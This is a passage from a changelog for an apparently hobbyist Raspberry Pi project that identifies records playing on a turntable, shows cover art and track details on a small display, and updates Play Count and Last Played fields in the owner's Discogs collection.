  by default) with instructions for enabling it.
- 7 new unit tests in `tests/test_discogs_client.py` covering `update_last_played`
  (not configured no-op, happy path, ISO date format verification, field not found,
  non-204 POST, 401, exception handling).
- 3 new unit tests in `tests/test_listen_tracker.py` covering Last Played integration
  (called when configured, not called when unconfigured, failure is non-fatal).

### Changed

- `ListenTracker._end_session()` now calls `update_last_played()` after
  `increment_play_count()` when `last_played_field_name` is configured. A failure
  from `update_last_played` is logged as a warning but does not affect the Play Count
  result — the two updates are independent.
- Log message updated: "incrementing Play Count in Discogs" →
  "incrementing Play Count and updating Last Played in Discogs".
- Total unit test count: 138 → 148.

---

## [1.0.1] — 2026-05-24

### Changed

- **Play Count replaces "Listened?" boolean** — `DiscogsClient.mark_as_listened()`
  (which set a dropdown field to "Yes") is replaced by `increment_play_count()`,
  which reads the current integer value of a "Play Count" custom field and
  increments it by 1. An empty Play Count field implies unlistened, making the
  separate boolean redundant.
- `discogs.listened_field_name` and `discogs.listened_field_value` config keys
  replaced by a single `discogs.play_count_field_name` key.
- `ListenTracker` updated to call `increment_play_count()` instead of
  `mark_as_listened()`; log messages updated accordingly.

### Added

- `DiscogsClient._get_field_value()` — reads the current raw value of a custom
  field from the collection API response, used by `increment_play_count()` to
  determine the value before incrementing (read-before-write pattern; falls back
  to 0 on GET failure or blank field).
- `tests/test_discogs_client.py` — new unit test file covering 14 scenarios for
  `increment_play_count` and `_get_field_value` (blank field, existing counts,
  garbage values, field-not-found, GET/POST failures, exceptions).

---

## [1.0.0] — 2026-05-24

Initial release. Full core loop operational: turntable audio → Shazam
recognition → Discogs metadata → pygame display → Discogs field update.

### Added

**Audio pipeline**
- `AudioCapture` — records overlapping 15s chunks from USB audio interface
  via `sounddevice`; dispatches to silence detector and recognition queue
- `SilenceDetector` — RMS-based silence/music classification; emits
  `MUSIC_STARTED`, `MUSIC_STOPPED`, and `SESSION_ENDED` lifecycle events;
  `SESSION_ENDED` requires sustained silence after music (default 45s) and
  fires at most once per session

**Recognition**
- `RecognitionLoop` — async polling loop with configurable N-of-consecutive-
  matches confirmation gate (default 2) to prevent flickering on noisy results
- `ShazamIOBackend` — serialises audio to in-memory WAV, calls ShazamIO;
  swappable via `recognition.backend` config key (ACRCloud and AudD stubs ready)

**Metadata**
- `MetadataResolver` — three-tier lookup chain: Discogs collection →
  Discogs database → MusicBrainz/Shazam fallback; always returns a
  `TrackMetadata` regardless of which tier succeeds
- `DiscogsClient` — collection search with 25-candidate database cross-
  reference strategy plus full collection-walk fallback for rare pressings;
  custom field update via Discogs REST API
- `CoverArtFallback` — MusicBrainz Cover Art Archive lookup for releases
  not found in Discogs

**Display**
- `DisplayRenderer` — pygame fullscreen renderer at configurable resolution
  (default 1024×600 for Waveshare 7" HDMI LCD H); dirty-flag redraw at ~30fps
- Three screens: idle (dark), listening ("Listening…"), now-playing (cover
  art + artist / album / track / meta / position / source badge)
- `NowPlayingLayout` — proportional pixel geometry; resolution-independent;
  scales correctly at 640×480, 800×480, 1024×600, 1280×720
- Cover art downloaded from Discogs/MusicBrainz URLs with MD5-keyed disk cache
- Fallback source indicator badge when metadata comes from MusicBrainz

**State & tracking**
- `PlayerState` — central in-memory state with observer pattern;
  status enum: `IDLE → LISTENING → PLAYING → IDLE`
- `ListenTracker` — manages `PlaySession` lifecycle; updates Discogs field
  only when last track is confirmed AND release is in collection (conservative
  by design — partial plays do not trigger an update)
- `PlaySession` — deduplicates consecutive track logs; latches release/instance
  IDs from the first Discogs-sourced track

**Infrastructure**
- `VERSION` file at repo root; `main.py` logs version at startup
- GitHub Actions workflow auto-syncs README version badge when `VERSION` changes
- 124-test unit suite covering all non-hardware components (models, silence
  detection, listen tracker, metadata resolver, recognition loop, display layout)
- `test_discogs_live.py` — live Discogs integration test with read-only and
  `--test-write` modes; tests collection search, database search, tracklist
  fetch, custom field detection, and field update

**Documentation**
- `docs/architecture.md` — full system design, component reference, data flows,
  state machine, config reference
- `docs/testing-guide.md` — prerequisites, test inventory, run commands,
  per-suite descriptions, common failure modes
- `docs/pi-setup-guide.md` — OS flash, display config, UCA222 setup, venv,
  first run, systemd autostart, troubleshooting
- `docs/hardware-guide.md` — parts list and wiring diagram
- `docs/roadmap.md` — versioned feature plan through v1.6.0
